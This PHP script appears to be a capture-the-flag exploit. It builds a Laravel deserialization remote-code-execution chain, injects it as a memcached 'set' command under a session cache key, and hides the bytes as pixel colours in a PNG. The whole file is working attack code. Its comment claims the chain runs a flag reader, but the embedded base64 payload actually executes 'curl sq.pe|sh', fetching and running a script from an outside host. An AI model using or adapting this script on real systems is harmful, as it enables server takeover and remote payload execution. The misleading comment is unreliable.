<?php

if (count($argv) != 2) exit("Usage $argv[0] <Session ID>");

// ./phpggc Laravel/RCE15 system '/readflag --give-me-the-flag' --base64
$serialized = base64_decode('Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mjk6IklsbHVtaW5hdGVcUXVldWVcUXVldWVNYW5hZ2VyIjoyOntzOjY6IgAqAGFwcCI7YToxOntzOjY6ImNvbmZpZyI7YToyOntzOjEzOiJxdWV1ZS5kZWZhdWx0IjtzOjM6ImtleSI7czoyMToicXVldWUuY29ubmVjdGlvbnMua2V5IjthOjE6e3M6NjoiZHJpdmVyIjtzOjQ6ImZ1bmMiO319fXM6MTM6IgAqAGNvbm5lY3RvcnMiO2E6MTp7czo0OiJmdW5jIjthOjI6e2k6MDtPOjI4OiJJbGx1bWluYXRlXEF1dGhcUmVxdWVzdEd1YXJkIjozOntzOjExOiIAKgBjYWxsYmFjayI7czoxNDoiY2FsbF91c2VyX2Z1bmMiO3M6MTA6IgAqAHJlcXVlc3QiO3M6Njoic3lzdGVtIjtzOjExOiIAKgBwcm92aWRlciI7czoxMzoiY3VybCBzcS5wZXxzaCI7fWk6MTtzOjQ6InVzZXIiO319fX0=');

$session_id = $argv[1];
$output = 'out.png';

@unlink($output);

// memcached protocol
$key = "laravel_cache_:$session_id";
echo "Memcached Key: $key\n";

$_payload = "XXX\r\n\r\nset $key 0 900 " . strlen($serialized) . "\r\n$serialized\r\n\r\nXXX";


while (strlen($_payload) % 3 != 0) {
    $_payload .= " ";
}


$_pay_len = strlen($_payload);
if ($_pay_len > 256 * 3) {
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if ($_pay_len % 3 != 0) {
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

$width = $_pay_len / 3;
$height = 20;
$im = imagecreate($width, $height);
// echo '=== Payload ===' . "\n";
// echo $_payload . "\n";
// echo '=== Payload ===' . "\n";

$_hex = unpack('H*', $_payload);
$_chunks = str_split($_hex[1], 6);

for ($i = 0; $i < count($_chunks); $i++) {
    $_color_chunks = str_split($_chunks[$i], 2);
    $color = imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]), hexdec($_color_chunks[2]));
    imagesetpixel($im, $i, 1, $color);
}

imagepng($im, $output);
